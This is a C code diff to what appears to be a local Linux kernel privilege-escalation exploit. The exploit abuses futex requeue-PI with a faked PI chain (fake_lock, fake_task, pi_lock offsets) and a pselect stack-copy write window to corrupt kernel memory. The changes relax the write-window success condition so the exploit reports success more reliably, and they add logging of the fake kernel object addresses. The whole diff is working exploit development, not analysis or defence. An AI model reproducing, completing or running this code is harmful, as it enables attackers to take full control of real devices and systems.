@@ -329,8 +329,15 @@ void slide_pselect_stack_copy(void) {
           atomic_load(&slide_consume_sched_ok),
           atomic_load(&slide_consume_last_sched_ret),
           atomic_load(&slide_consume_last_sched_errno));
+  /*
+   * PI-driven writes run while pselect is blocked. On app physical path the
+   * timeout often returns ret==0 with sched_ok==1; requiring ret>0 falsely
+   * reported write window failure (status=256) after a successful chain walk.
+   */
   atomic_store(&slide_pselect_write_window,
-               ret > 0 && atomic_load(&slide_consume_sched_ok) > 0);
+               atomic_load(&slide_consume_sched_ok) > 0 &&
+                   atomic_load(&slide_consume_enter_sched) > 0 &&
+                   ret >= 0);
 
   close(high_read);
   if (block_fd != pipefd[0]) {
@@ -612,15 +619,28 @@ static int slide_child_trigger_write(void) {
       usleep(SLIDE_REQUEUE_POLL_USEC);
     }
   }
+  pr_info("slide child cmp_requeue_pi ret=%ld errno=%d polls=%d "
+          "deadlock_want=%d waiter_ok=%d write_window=%d "
+          "fake_lock=%016zx fake_task=%016zx pi_lock=%016zx delta=%lld\n",
+          requeue_ret, requeue_errno, requeue_polls,
+          (requeue_ret == -1 && requeue_errno == EDEADLK),
+          atomic_load(&slide_waiter_ok),
+          atomic_load(&slide_pselect_write_window), fake_lock, fake_task,
+          fake_task ? fake_task + FAKE_TASK_PI_LOCK_OFF : 0,
+          (long long)g_skb_data_delta);
   if (requeue_ret != -1 || requeue_errno != EDEADLK) {
+    pr_warning("slide child requeue did not EDEADLK (PI chain miss)\n");
     return 0;
   }
   atomic_store(&slide_deadlock_seen, 1);
   while (!atomic_load(&slide_route_done)) {
     usleep(1000);
   }
-  return atomic_load(&slide_waiter_ok) != 0 &&
-         atomic_load(&slide_pselect_write_window) != 0;
+  int waiter_ok = atomic_load(&slide_waiter_ok) != 0;
+  int write_window = atomic_load(&slide_pselect_write_window) != 0;
+  pr_info("slide child trigger done waiter_ok=%d write_window=%d\n",
+          waiter_ok, write_window);
+  return waiter_ok && write_window;
 }
 
 static int slide_trigger_physical_state(void) {
